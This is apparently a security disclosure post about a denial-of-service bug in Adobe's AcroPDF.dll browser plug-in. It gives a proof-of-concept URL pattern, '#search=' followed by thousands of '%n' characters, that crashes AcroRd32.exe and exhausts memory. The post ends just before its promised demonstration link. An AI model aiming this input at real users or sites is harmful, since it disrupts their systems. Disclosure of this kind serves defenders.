Well, Adobe guys do a good job after the publication of a variety of
bug in AcroPDF.dll, one for all

From Secunia:
"Input passed to a hosted PDF file is not properly sanitised by the
  browser plug-in before being returned to users. This can be exploited
  to execute arbitrary script code in a user&#039;s browser session in context
  of an affected site."

So now the dll is able to understand when you&#039;re trying to insert something
wrong prompting you with "One or more of the query terms are too long."
and that&#039;s a good thing but... I thought "can this dll sanitise chars like 
%n"
Well the answer is: no.

Unfortunately (sure depends by the point of view) Internet Explorer is
not useful for a test &#039;cause a limited number of chars (only 2083) is 
admitted
in the address bar, so we need to use browser like Firefox and stuff like
that.
When you browse to a hosted pdf file like this
http://somesite/poc.pdf#search=%n%n%n... x 10000 (or much more if you like)
the browse will stop to answer until the process AcroRd32.exe crashes,
the CPU usage is about 50-60% and the paging file usage grow until
it&#039;s full and you have the message "Insufficient virtual memory..."
Here&#039;s a proof of concept, for online demonstration see:
